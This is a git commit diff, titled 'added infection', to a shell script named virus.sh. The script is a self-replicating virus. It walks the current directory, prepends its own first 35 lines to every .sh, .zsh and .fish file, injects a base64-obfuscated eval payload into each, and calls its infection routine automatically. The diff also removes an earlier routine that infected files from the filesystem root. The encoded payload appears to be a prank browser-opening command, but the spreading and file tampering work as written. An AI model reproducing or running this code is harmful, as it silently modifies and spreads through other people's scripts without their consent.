f686eb53eed9ea03fa7cccdd7acab7dd05243694
NewDawn0 <92283105+NewDawn0@users.noreply.github.com>
2022-04-12 00:06:27 +0200

    added infection

--- virus.sh
+++ virus.sh
@@ -5,38 +5,31 @@ function append() {
     awk -i inplace 'BEGINFILE{print"eval $(echo \"cHl0aG9uIC1jICJpbXBvcnQgd2ViYnJvd3Nlcjsgd2ViYnJvd3Nlci5vcGVuKFwiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUVwiKSIK\" | base64 -d)"}{print}' $file
     awk -i inplace 'BEGINFILE{print"#!/bin/sh"}{print}' $file
 }
-function basicSysInfec() {
+function inf() {
     shellfiles=$(find . -type f -name '*.sh')
     zshfiles=$(find . -type f -name "*.zsh")
     fishfiles=$(find . -type f -name "*.fish")
     for file in $shellfiles; do
         file="$(pwd)${file:1}"
+        this=$(echo $0 )
+        this=$(echo ${this##*/})
+        awk 'NR>=1&&NR<=35' $this | cat - $file > temp && mv temp $file
         append $file
     done
     for file in $zshfiles; do
         file="$(pwd)${file:1}"
+        this=$(echo $0 )
+        this=$(echo ${this##*/})
+        awk 'NR>=1&&NR<=35' $this | cat - $file > temp && mv temp $file
         append $file
     done
     for file in $fishfiles; do
         file="$(pwd)${file:1}"
+        this=$(echo $0 )
+        this=$(echo ${this##*/})
+        awk 'NR>=1&&NR<=35' $this | cat - $file > temp && mv temp $file
         append $file
     done
 }
-function fullSysInfec() {
-    cd /
-    shellfiles=$(find . -type f -name '*.sh')
-    zshfiles=$(find . -type f -name "*.zsh")
-    fishfiles=$(find . -type f -name "*.fish")
-    for file in $shellfiles; do
-        file="$(pwd)${file:1}"
-        append $file
-    done
-    for file in $zshfiles; do
-        file="$(pwd)${file:1}"
-        append $file
-    done
-    for file in $fishfiles; do
-        file="$(pwd)${file:1}"
-        append $file
-    done
-}
+inf
+infec=true
